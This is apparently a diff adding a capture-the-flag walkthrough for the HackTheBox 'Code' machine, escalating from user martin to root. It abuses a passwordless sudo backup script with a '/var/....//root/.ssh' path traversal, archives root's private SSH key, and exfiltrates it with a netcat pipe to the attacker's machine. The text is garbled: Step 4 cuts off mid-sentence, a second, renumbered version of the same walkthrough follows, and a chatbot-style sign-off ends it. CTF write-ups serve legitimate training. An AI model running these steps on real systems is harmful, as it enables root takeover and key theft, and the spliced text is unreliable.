@@ -379,3 +379,377 @@ sudo -l
 find / -perm -4000 2>/dev/null
 find /home /var -writable 2>/dev/null
 getcap -r / 2>/dev/null
+
+# HTB: Code — Post-Access Privilege Escalation (Full Explanation from Martin Login to Root)
+
+## 🧠 Context and Entry Point
+
+After achieving initial remote code execution through the web-based Python editor, you obtained a shell as the `app-production` user. This gave access to a database file that contained user credentials. Cracking those led to the discovery of SSH credentials for another user: **`martin`**.
+
+This walkthrough begins **after you have successfully logged in via SSH as `martin`**.
+
+---
+
+## 🔐 Step 1: SSH Into the Target as Martin
+
+After cracking `martin`’s password (e.g., from the SQLite `database.db` in `/home/app-production/app/instance/`), log into the target:
+
+```bash
+ssh martin@code.htb
+```
+
+> If you get a DNS error, resolve it by replacing `code.htb` with the IP of the box, e.g.:
+```bash
+ssh martin@10.129.34.41
+```
+
+Once connected, verify identity and privileges:
+
+```bash
+whoami      # Should return: martin
+hostname    # Optional: confirms you're on the target
+```
+
+Next, enumerate sudo permissions:
+
+```bash
+sudo -l
+```
+
+You should see something like:
+
+```
+User martin may run the following commands on code:
+    (ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+> 🔍 **This means**: `martin` can execute `/usr/bin/backy.sh` with root privileges **without needing a password.**
+
+---
+
+## 🔎 Step 2: Investigate `/usr/bin/backy.sh`
+
+To understand how to escalate privileges, examine what the script does:
+
+```bash
+cat /usr/bin/backy.sh
+```
+
+You'll notice that it:
+- Accepts a JSON file path as an argument.
+- Passes that JSON to a binary called `/usr/bin/backy`.
+- That binary then reads a set of tasks (directories to archive) and zips them to a destination folder.
+
+### 💡 Key Insight:
+We can abuse this mechanism by **tricking it into archiving sensitive files** (like `/root/.ssh/id_rsa` or `/root/root.txt`), even though we’re not root — because **`backy` runs as root** when triggered via `sudo`.
+
+---
+
+## 📁 Step 3: Create the Required Backup Directory
+
+Let’s set up our working directory and JSON configuration file:
+
+```bash
+mkdir -p /home/martin/backups
+cd /home/martin/backups
+```
+
+Then create a `task.json` file that the `backy.sh` script will read:
+
+```bash
+nano task.json
+```
+
+Paste in the following *innocent-looking* task:
+
+```json
+{
+  "destination": "/home/martin/backups/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/home/martin"
+  ]
+}
+```
+
+Save and exit.
+
+Then test the script:
+
+```bash
+sudo /usr/bin/backy.sh /home/martin/backups/task.json
+```
+
+✅ You should see output indicating that files in `/home/martin` were archived and a `.tar.bz2` file appeared in the backups folder.
+
+This confirms the script works — now it’s time to abuse it.
+
+---
+
+## 🚪 Step 4: Privilege Escalation via Path Traversal
+
+Since we want to access **`/root/.ssh
+    (ALL) NOPASSWD: /usr/bin/backy.sh
+```
+
+This output tells us two things:
+- ✅ You can run `/usr/bin/backy.sh` as root using `sudo`
+- ✅ You **do not need a password** to run it (NOPASSWD)
+- ✅ This is a **limited sudo access**, which makes it a potential escalation path
+
+---
+
+## 🛠 Step 2: Understand What `backy.sh` Is
+
+Let’s take a look at the script you’re allowed to run with root privileges:
+
+```bash
+cat /usr/bin/backy.sh
+```
+
+You’ll likely find that the script:
+- Accepts a JSON file as input
+- Passes that input to a binary called `backy`
+- That binary appears to create `.tar.bz2` backup archives based on paths provided in the JSON
+
+**Example structure of a task file (`task.json`)**:
+
+```json
+{
+  "destination": "/home/martin/backups/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/home/martin"
+  ]
+}
+```
+
+You can test this by creating the necessary directories:
+
+```bash
+mkdir -p ~/backups
+nano ~/backups/task.json
+```
+
+Paste the JSON above into the file and then run:
+
+```bash
+sudo /usr/bin/backy.sh ~/backups/task.json
+```
+
+This will create a backup archive in `/home/martin/backups/` of the directory `/home/martin`.
+
+Check that it worked:
+
+```bash
+ls ~/backups
+```
+
+---
+
+## 🚩 Step 3: Locate the User Flag
+
+At this point, your goal is to retrieve the user flag.
+
+Check where it’s stored:
+
+```bash
+ls -l /home/app-production/
+```
+
+You’ll likely see:
+
+```
+-r-------- 1 root root 33 user.txt
+```
+
+This tells us:
+- The file **exists**
+- It is located in `/home/app-production/user.txt`
+- It is owned by `root` and only readable by `root`
+- Even though it's in another user’s home folder, you **cannot read it as `martin`**
+
+Trying this will fail:
+
+```bash
+cat /home/app-production/user.txt
+# Permission denied
+```
+
+---
+
+## 🚀 Step 4: Attempt Privilege Escalation via backy.sh
+
+Your only allowed `sudo` action is to run `backy.sh`, which allows us to influence what the `root` user accesses, **indirectly**, via the backup system.
+
+What’s our idea?
+> Trick `backy.sh` into backing up a **directory owned by root**, such as `/root` or `/root/.ssh`, and saving that archive in a location we can access (like `/home/martin/backups/`).
+
+But there’s a problem:
+- The script **validates** the paths in the JSON
+- It blocks **absolute paths to `/root`**
+- Simple attempts like:
+  ```json
+  "directories_to_archive": ["/root"]
+  ```
+  Will be rejected or result in:
+  ```
+  Nothing to archive
+  ```
+
+---
+
+## 🧙 Step 5: Path Traversal Bypass via `/var/....//root`
+
+This is a **classic Golang `filepath.Clean()` bypass** using a path that *looks like* `/var`, but really resolves to `/root`.
+
+Create a new `task.json`:
+
+```bash
+cat > ~/backups/task.json << 'EOF'
+{
+  "destination": "/home/martin/backups/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/var/....//root/.ssh"
+  ]
+}
+EOF
+```
+
+Here’s what happens:
+- `....//` is parsed as `../`
+- `/var/....//root/.ssh` → `/root/.ssh`
+- The backup program reads from `/root/.ssh` as **root**
+- The result is archived into a `.tar.bz2` file you can extract!
+
+Now run the backup:
+
+```bash
+sudo /usr/bin/backy.sh ~/backups/task.json
+```
+
+Look for output like:
+
+```
+📤 Archiving: [/var/....//root/.ssh]
+📥 To: /home/martin/backups ...
+📦
+tar: Removing leading `/var/../' from member names
+/var/../root/.ssh/id_rsa
+```
+
+---
+
+## 🧰 Step 6: Extract the SSH Private Key for Root
+
+Check the output files:
+
+```bash
+ls -l ~/backups | grep root
+```
+
+You’ll likely find:
+
+```
+code_var_.._root_.ssh_2025_July.tar.bz2
+```
+
+Extract it:
+
+```bash
+tar -xvjf code_var_.._root_.ssh_2025_July.tar.bz2
+```
+
+It will create:
+
+```
+root/.ssh/id_rsa
+root/.ssh/authorized_keys
+```
+
+View the key:
+
+```bash
+cat root/.ssh/id_rsa
+```
+
+This is the **private key for root**, which we’ll use to log in.
+
+---
+
+## 🔁 Step 7: Transfer the SSH Key Back to Your Kali Box
+
+Open a terminal on your Kali box and start a listener:
+
+```bash
+nc -lvnp 9001 > id_rsa
+```
+
+On the target machine (still logged in as `martin`):
+
+```bash
+cat root/.ssh/id_rsa | nc <your_kali_ip> 9001
+```
+
+Once it’s received:
+
+```bash
+chmod 600 id_rsa
+```
+
+You now have root’s SSH key on your machine.
+
+---
+
+## 🚪 Step 8: Log In as Root
+
+Use the key to SSH into the machine:
+
+```bash
+ssh -i id_rsa root@code.htb
+```
+
+Or if `code.htb` isn’t resolving:
+
+```bash
+ssh -i id_rsa root@<target-IP>
+```
+
+---
+
+## 🏁 Step 9: Capture the Flags
+
+### 📍 User Flag:
+Now that you’re root:
+
+```bash
+cat /home/app-production/user.txt
+```
+
+### 👑 Root Flag:
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## ✅ Recap: Why This Worked
+
+| Step | Action | Why it Worked |
+|------|--------|----------------|
+| SSH as `martin` | Gained stable access with cracked credentials | Pivoted from `app-production` |
+| Analyzed `sudo -l` | Found privilege to run `backy.sh` as root | Identified our escalation vector |
+| Used path traversal | Bypassed `backy`’s path filtering | Accessed `/root/.ssh` via a fake path |
+| Extracted private key | Tar archive gave us `id_rsa` | We impersonated root |
+| SSH with private key | No password needed | We are now root |
+| Collected flags | Root can read both user and root files | Game over |
+
+---
+
+Let me know if you'd like this converted into a downloadable `.md` file or bundled with screenshots.
+
